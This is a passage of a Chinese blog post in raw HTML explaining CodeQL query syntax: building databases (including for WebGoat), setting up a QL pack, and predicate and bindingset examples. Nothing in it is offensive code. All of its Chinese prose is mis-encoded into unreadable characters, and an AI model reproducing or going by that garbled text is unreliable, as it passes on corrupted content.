class="language-bash">JavaScript</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/databases/code-database&quot; --language=javascript</span><br></pre></td></tr></table></figure><p><code>CodeQL</code>ä¸æ”¯æŒ<code>PHP</code>ï¼Œæ”¯æŒçš„ç¼–ç¨‹è¯­è¨€ç±»å‹ï¼Œå‚è€ƒå®˜ç½‘<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ã€‚å¯¹äº<code>Java</code>ä»£ç æœ‰äº›ä¸åŒï¼Œéœ€è¦è¿›è¡Œä»£ç çš„ç¼–è¯‘å<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>ï¼Œæ‰èƒ½ç”Ÿæˆç›¸å…³çš„æ•°æ®åº“ã€‚</p><p>ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œè‹¥å‡ºç°ç¯å¢ƒé—®é¢˜å¯ä½¿ç”¨<code>--verbose</code>è¾“å‡ºè¯¦ç»†çš„é”™è¯¯ï¼Œè¿›è¡Œé”™è¯¯çš„å®šä½ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create webgoat-qldb -language= java --command &quot;./mvnw clean package -DskipTests&quot; --verbose</span><br></pre></td></tr></table></figure><p>å¯¹äº<code>Java</code>ä»£ç çš„ç‰¹æ®Šæ€§<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>ï¼Œï¼Œå®æˆ˜ä¸­è·å–åˆ°çš„å¯èƒ½æ˜¯ç¼–è¯‘åçš„<code>Java</code>ä»£ç ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨å·¥å…·<code>CodeQLpy</code><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>ï¼Œå®ƒå¯ä»¥å¯¹å¤šç§ä¸åŒç±»å‹çš„javaä»£ç è¿›è¡Œä»£ç å®¡è®¡ï¼ŒåŒ…æ‹¬jspæ–‡ä»¶ã€SpringMVCçš„waråŒ…ã€SpringBootçš„jaråŒ…ã€mavenæºä»£ç ã€‚</p><h2 id="åŸºç¡€è¯­æ³•ç»“æ„">åŸºç¡€è¯­æ³•ç»“æ„</h2><p><code>Codeql</code>æŸ¥è¯¢è¯­æ³•æœ‰ç‚¹ç±»ä¼¼<code>SQL</code>æŸ¥è¯¢ï¼Œç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Query metadata</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import <span class="comment">/* ... CodeQL libraries or modules ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... Optional, define CodeQL classes and predicates ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="comment">/* ... å˜é‡å£°æ˜ ... */</span></span><br><span class="line"><span class="keyword">where</span> <span class="comment">/* ... é€»è¾‘å¤„ç† ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... è¡¨è¾¾å¼ ... */</span></span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™ç¬¬ä¸€ä¸ªæŸ¥è¯¢">ç¼–å†™ç¬¬ä¸€ä¸ªæŸ¥è¯¢</h2><h3 id="åˆ›å»ºç¬¬ä¸€ä¸ªQLåŒ…">åˆ›å»ºç¬¬ä¸€ä¸ªQLåŒ…</h3><p>è¿™é‡Œä»¥<code>WebGoat</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>åˆ›å»ºçš„æ•°æ®åº“ä¸ºæŸ¥è¯¢å¯¹è±¡ã€‚</p><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾åç»­ä½ ç¼–å†™çš„<code>CodeQL</code>è„šæœ¬ï¼Œ<code>CodeQL</code>å®˜æ–¹ç§°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸º<code>QL Pack</code>ã€‚</p><p>ä¾‹å¦‚åä¸º<code>qltest</code>çš„æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨é‡Œé¢åˆ›å»º1ä¸ª<code>QL Pack</code>çš„é…ç½®æ–‡ä»¶ï¼Œåç§°å›ºå®šä¸º<code>qlpack.yml</code>ã€‚å†åˆ›å»ºä¸€ä¸ªqlåç¼€çš„æ–‡ä»¶ï¼Œåç§°éšæ„ã€‚</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223211310603.png" alt="image-20250223211310603"></p><p><code>qlpack.yml</code>æ–‡ä»¶ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">qltest</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-java</span></span><br></pre></td></tr></table></figure><ul><li><p>ç¬¬ä¸€è¡Œè¡¨ç¤ºè¿™ä¸ªQLåŒ…çš„åç§°ä¸º<code>qltest</code>ï¼Œå¿…é€‰ï¼Œå¦‚æœä½ åœ¨VSCodeä¸­åŒæ—¶æ‰“å¼€å¤šä¸ªQLåŒ…æ—¶ï¼Œè¦ä¿è¯è¿™ä¸ªnameçš„å€¼å”¯ä¸€ä¸é‡å¤ã€‚</p></li><li><p>ç¬¬äºŒè¡Œè¡¨ç¤ºè¿™ä¸ªQLåŒ…çš„ç‰ˆæœ¬å·ï¼Œå¿…é€‰ã€‚</p></li><li><p>ç¬¬ä¸‰è¡Œè¡¨ç¤ºè¿™ä¸ªQLåŒ…çš„ä¾èµ–ï¼Œå¿…é€‰ï¼Œcodeql-javaè¡¨ç¤ºéœ€è¦Javaè¯­è¨€çš„QLæ ‡å‡†åº“ä¾èµ–ã€‚</p></li></ul><p>åœ¨VSCodeçš„CodeQLæ’ä»¶ä¸­æ·»åŠ ç”¨CodeQLåˆ›å»ºçš„WebGoatçš„æ•°æ®åº“</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223210106772.png" alt="image-20250223210106772"></p><h3 id="ç¼–å†™æŸ¥è¯¢">ç¼–å†™æŸ¥è¯¢</h3><p>åœ¨<code>webgoat-query.ql</code>æ–‡ä»¶ä¸­ç¼–å†™å¦‚ä¸‹ä»£ç ï¼Œç”¨æ¥æŸ¥æ‰¾WebGoaté¡¹ç›®ä¸­æ‰€æœ‰å£°æ˜çš„æ–¹æ³•ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Method</span> m</span><br><span class="line"><span class="keyword">select</span> m</span><br></pre></td></tr></table></figure><p>ç„¶åå³é”®ç‚¹å‡»<code>webgoat-query.ql</code>æ–‡ä»¶ï¼Œç‚¹å‡»ã€CodeQL: Run Query ã€‘æ¥æ‰§è¡Œæœ¬æ¬¡æŸ¥è¯¢ï¼Œæ‰§è¡Œå®Œæˆååœ¨å³è¾¹å¯ä»¥çœ‹åˆ°å¤šå‡ºä¸€åˆ—ç”¨æ¥æ˜¾ç¤ºæŸ¥è¯¢ç»“æœã€‚</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250223211244232.png" alt="image-20250223211244232"></p><h2 id="QLè¯­è¨€å‚è€ƒ">QLè¯­è¨€å‚è€ƒ</h2><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/">å…³äº QL è¯­è¨€</a>ï¼šQL æ˜¯ CodeQL çš„å¼ºå¤§æŸ¥è¯¢è¯­è¨€ï¼Œç”¨äºåˆ†æä»£ç ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/predicates/">è°“è¯</a>ï¼šè°“è¯ç”¨äºæè¿°æ„æˆ QL ç¨‹åºçš„é€»è¾‘å…³ç³»ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/queries/">æŸ¥è¯¢</a>ï¼šæŸ¥è¯¢æ˜¯ QL ç¨‹åºçš„è¾“å‡ºã€‚ä»–ä»¬è¯„ä¼°ç»“æœé›†ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/types/">ç±»å‹</a>ï¼šQL æ˜¯ä¸€ç§é™æ€ç±»å‹è¯­è¨€ï¼Œå› æ­¤æ¯ä¸ªå˜é‡éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå£°æ˜çš„ç±»å‹ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/modules/">æ¨¡å—</a>ï¼šæ¨¡å—æä¾›äº†ä¸€ç§é€šè¿‡å°†ç›¸å…³ç±»å‹ã€è°“è¯å’Œå…¶ä»–æ¨¡å—ç»„åˆåœ¨ä¸€èµ·æ¥ç»„ç»‡ QL ä»£ç çš„æ–¹æ³•ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/aliases/">åˆ«å</a>ï¼šåˆ«åæ˜¯ç°æœ‰ QL å®ä½“çš„æ›¿ä»£åç§°ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/variables/">å˜é‡</a>ï¼šQL ä¸­çš„å˜é‡ä¸ä»£æ•°æˆ–é€»è¾‘ä¸­çš„å˜é‡çš„ä½¿ç”¨æ–¹å¼ç±»ä¼¼ã€‚å®ƒä»¬ä»£è¡¨ä¸€ç»„å€¼ï¼Œè¿™äº›å€¼é€šå¸¸å—å…¬å¼é™åˆ¶ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/expressions/">è¡¨è¾¾å¼</a>ï¼šè¡¨è¾¾å¼è®¡ç®—ä¸ºä¸€ç»„å€¼å¹¶å…·æœ‰ç±»å‹ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/formulas/">å…¬å¼</a>ï¼šå…¬å¼å®šä¹‰äº†è¡¨è¾¾å¼ä¸­ä½¿ç”¨çš„è‡ªç”±å˜é‡ä¹‹é—´çš„é€»è¾‘å…³ç³»ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/annotations/">æ³¨é‡Š</a>ï¼šæ³¨é‡Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‚¨å¯ä»¥å°†å…¶ç›´æ¥æ”¾åœ¨ QL å®ä½“æˆ–åç§°çš„å£°æ˜ä¹‹å‰ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/recursion/">é€’å½’</a>ï¼šQL ä¸ºé€’å½’æä¾›äº†å¼ºå¤§çš„æ”¯æŒã€‚å¦‚æœ QL ä¸­çš„è°“è¯ç›´æ¥æˆ–é—´æ¥ä¾èµ–äºè‡ªèº«ï¼Œåˆ™ç§°å…¶ä¸ºé€’å½’è°“è¯ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/lexical-syntax/">è¯æ³•è¯­æ³•</a>ï¼šQL è¯­æ³•åŒ…æ‹¬ä¸åŒç§ç±»çš„å…³é”®å­—ã€æ ‡è¯†ç¬¦å’Œæ³¨é‡Šã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/">åç§°è§£æ</a>ï¼šQL ç¼–è¯‘å™¨å°†åç§°è§£æä¸ºç¨‹åºå…ƒç´ ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/">QLæ–¹æ¡ˆçš„è¯„ä»·</a>ï¼šä»¥å¤šä¸ªä¸åŒçš„æ­¥éª¤è¯„ä¼°QLç¨‹åºã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/">QL è¯­è¨€è§„èŒƒ</a>ï¼šQLè¯­è¨€çš„å½¢å¼è§„èŒƒã€‚å®ƒä¸ºæœ¯è¯­ï¼Œè¯­æ³•å’Œæœ‰å…³QLçš„å…¶ä»–æŠ€æœ¯ç»†èŠ‚æä¾›äº†å…¨é¢çš„å‚è€ƒã€‚</li></ul><h3 id="è°“è¯Predicates">è°“è¯Predicates</h3><p>å®˜æ–¹æ–‡æ¡£<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup> ,è°“è¯ï¼ˆPredicatesï¼‰æœ‰ç‚¹ç±»ä¼¼äºå…¶ä»–è¯­è¨€ä¸­çš„å‡½æ•°ï¼Œä½†åˆä¸å‡½æ•°ä¸åŒï¼Œè°“è¯ç”¨äºæè¿°æ„æˆ QL ç¨‹åºçš„é€»è¾‘å…³ç³»ã€‚ç¡®åˆ‡çš„è¯´ï¼Œè°“è¯æè¿°çš„æ˜¯ç»™å®šå‚æ•°ä¸å…ƒç»„é›†åˆçš„å…³ç³»ã€‚<br>å®šä¹‰è°“è¯æœ‰ä»¥ä¸‹å‡ ä¸ªæ³¨æ„ç‚¹(å‘ç‚¹)ï¼š</p><ol><li>éœ€è¦æ³¨æ„çš„æ˜¯è°“è¯çš„åå­—<strong>å¼€å¤´å¿…é¡»æ˜¯å°å†™å­—æ¯</strong>ã€‚</li><li>ç»‘å®šè¡Œä¸ºä¸ç»‘å®šé›†ã€‚</li></ol><h4 id="æ— ç»“æœè°“è¯">æ— ç»“æœè°“è¯</h4><p>æ²¡æœ‰ç»“æœçš„è°“è¯ä»¥predicateä½œä¸ºå¼€å¤´ï¼Œå‰©ä¸‹çš„è¯­æ³•ç»“æ„ç±»ä¼¼äºå®šä¹‰å‡½æ•°ã€‚è¿™ç§è°“è¯åªèƒ½åœ¨whereè¯­å¥ä¸­ä½¿ç”¨<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup>ã€‚</p><p>ä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">predicate isCity(string city) &#123;</span><br><span class="line">city <span class="operator">=</span> &quot;Beijing&quot;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">city <span class="operator">=</span> &quot;ShangHai&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string city</span><br><span class="line"><span class="keyword">where</span> city <span class="operator">=</span> &quot;Beijing&quot; <span class="keyword">and</span> isCity(city)</span><br><span class="line"><span class="keyword">select</span> city</span><br></pre></td></tr></table></figure><h4 id="ç»“æœè°“è¯">ç»“æœè°“è¯</h4><p>æœ‰ç»“æœçš„è°“è¯çš„å®šä¹‰ç±»ä¼¼äº<code>C/C++</code>è¯­è¨€çš„å‡½æ•°å®šä¹‰ï¼Œå·²è¿”å›ç±»å‹æ›¿ä»£<code>predicate</code>ä½œä¸ºå¼€å¤´ã€‚è¿™ç§è°“è¯å¯ä»¥åœ¨<code>where</code>ä¸<code>select</code>è¯­å¥ä¸­ä½¿ç”¨ã€‚</p><p>ç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">10</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> v</span><br><span class="line"><span class="keyword">where</span> v <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> addOne(v)</span><br></pre></td></tr></table></figure><h4 id="é€’å½’è°“è¯">é€’å½’è°“è¯</h4><p>è¿™é‡Œè¯´çš„é€’å½’å¹¶éæˆ‘ä»¬å¸¸è§„ç†è§£çš„å‡½æ•°é€’å½’ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºä¸€ä¸ª<strong>å¯åå‘æŸ¥æ‰¾çš„è°“è¯</strong>ï¼Œæˆ–è€…æ¢ä¸€ä¸ªæ€ç»´ï¼ŒæŠŠéé€’å½’çš„ç»“æœè°“è¯ç†è§£ä¸ºä¸€ä¸ªæœ‰å‘å›¾ï¼Œé‚£ä¹ˆ<strong>é€’å½’çš„ç»“æœè°“è¯å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ— å‘å›¾</strong>ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Germany&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> getANeighbor(<span class="keyword">result</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string people</span><br><span class="line"><span class="keyword">where</span> people <span class="operator">=</span> getANeighbor(&quot;Germany&quot;)</span><br><span class="line"><span class="keyword">select</span> people</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250317094330880.png" alt="image-20250317094330880"></p><p>è¾“å‡ºçš„ç»“æœä¸ºï¼š<code>France</code>ã€<code>Austria</code>ã€<code>Belgium</code>ã€‚</p><p>ä¸ºä»€ä¹ˆä¼šæœ‰<code>France</code>å‘¢ï¼Ÿ</p><p>å› ä¸º<code>getANeighbor(&quot;Germany&quot;)</code>ï¼Œç”±</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°<code>Austriaã€Belgium</code>ã€‚</p><p>è¿™é‡Œçš„é€’å½’ä¸æ˜¯<strong>å•å‘</strong>çš„ï¼Œè€Œæ˜¯<strong>åŒå‘</strong>çš„ï¼Œç”±äºå­˜åœ¨<code>France -&gt; Germany</code>ï¼Œæ‰€ä»¥ç”±<code>Germany</code>å¯ä»¥åå‘é€’å½’å¾—åˆ°<code>France</code>è¿™ä¸ªç»“æœã€‚</p><h4 id="ç‰¹å¾è°“è¯ã€éæˆå‘˜è°“è¯ã€æˆå‘˜è°“è¯">ç‰¹å¾è°“è¯ã€éæˆå‘˜è°“è¯ã€æˆå‘˜è°“è¯</h4><p>è°“è¯åˆ†ä¸ºä¸‰ç§ï¼Œå³<strong>éæˆå‘˜è°“è¯</strong>ã€<strong>æˆå‘˜è°“è¯è¯­</strong>å’Œ<strong>ç‰¹å¾è°“è¯</strong>ã€‚</p><ul><li><p>éæˆå‘˜è°“è¯æ˜¯åœ¨<strong>ç±»ä¹‹å¤–å®šä¹‰</strong>çš„ï¼Œå®ƒä»¬ä¸æ˜¯ä»»ä½•ç±»çš„æˆå‘˜ã€‚</p></li><li><p>æˆå‘˜è°“è¯åˆ™æ˜¯åœ¨ç±»é‡Œé¢å®šä¹‰çš„ã€‚</p></li><li><p>ç‰¹å¾è°“è¯åˆ™æ˜¯ç±»ä¸­çš„ç‰¹æ®Šè°“è¯ã€‚</p></li></ul><p>ç±»ä¼¼äºå…¶ä»–è¯­è¨€ä¸­ç±»çš„æ„é€ å‡½æ•°ã€‚</p><p>æ¯ç§è°“è¯çš„ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getSuccessor(<span class="type">int</span> i) &#123;  <span class="operator">/</span><span class="operator">/</span> <span class="number">1.</span> éæˆå‘˜è°“è¯(Non<span class="operator">-</span><span class="keyword">member</span> predicate)</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">  i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FavoriteNumbers extends <span class="type">int</span> &#123;</span><br><span class="line">  FavoriteNumbers() &#123;  <span class="operator">/</span><span class="operator">/</span> <span class="number">2.</span> ç‰¹å¾è°“è¯(Characteristic predicate)</span><br><span class="line">    this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">4</span> <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">9</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getName() &#123;   <span class="operator">/</span><span class="operator">/</span> <span class="number">3.</span> æˆå‘˜è°“è¯(<span class="keyword">Member</span> predicate) <span class="keyword">for</span> the class `FavoriteNumbers`</span><br><span class="line">    this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;one&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;four&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">9</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;nine&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»‘å®šè¡Œä¸ºä¸ç»‘å®šé›†">ç»‘å®šè¡Œä¸ºä¸ç»‘å®šé›†</h4><p>è°“è¯åªèƒ½åŒ…å«æœ‰é™æ•°é‡çš„å…ƒç»„ã€‚</p><p>æ­£ä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> æ­£ä¾‹ï¼Œiè¢«é™å®šåœ¨<span class="number">1</span>åˆ°<span class="number">10</span>å†…ï¼Œæˆ–è€…ä½ ä¹Ÿå¯ä»¥ç»™ièµ‹ä¸€ä¸ªç¡®å®šçš„å€¼å¦‚i<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">10</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> åä¾‹ï¼Œiæ˜¯æ— é™æ•°é‡å€¼çš„ï¼Œæ­¤æ—¶CodeQLç¼–è¯‘å™¨ä¼šæŠ¥é”™: The body <span class="keyword">of</span> this <span class="string">&#x27;test::addOne&#x27;</span> does <span class="keyword">not</span> bind <span class="string">&#x27;result&#x27;</span> <span class="keyword">to</span> a value.</span><br><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250317104709821.png" alt="image-20250317104709821"></p><h5 id="å•ä¸ªç»‘å®šé›†">å•ä¸ªç»‘å®šé›†</h5><p>ä¸ºäº†ä½¿ä¸Šè¿°çš„åä¾‹è°“è¯èƒ½å¤Ÿé€šè¿‡ç¼–è¯‘ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç»‘å®šé›†(bindingset)ï¼Œä½†æ˜¯å½“æˆ‘ä»¬å»è°ƒç”¨è¿™ä¸ªè°“è¯æ—¶ï¼Œä¼ é€’çš„å‚æ•°è¿˜æ˜¯<strong>åªèƒ½åœ¨æœ‰é™çš„å‚æ•°é›†ä¸­</strong>ã€‚<br>ä¸Šé¢çš„åä¾‹å¯ä»¥ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bindingset[i]</span><br><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å»è°ƒç”¨è¿™ä¸ªè°“è¯ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ä¼ é€’è¿‡æ¥çš„å‚æ•°è¿˜æ˜¯åªèƒ½åœ¨æœ‰é™çš„å‚æ•°é›†ä¸­</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">where</span> i <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> addOne(i)</span><br></pre></td></tr></table></figure><h5 id="å¤šä¸ªç»‘å®šé›†">å¤šä¸ªç»‘å®šé›†</h5><p>æˆ‘ä»¬åŒæ ·å¯ä»¥æ·»åŠ å¤šä¸ªç»‘å®šé›†ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x] bindingset[y]</span><br><span class="line">predicate plusOne(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">  x <span class="operator">+</span> <span class="number">1</span> <span class="operator">=</span> y</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> z</span><br><span class="line"><span class="keyword">where</span> z<span class="operator">=</span> <span class="number">2</span> <span 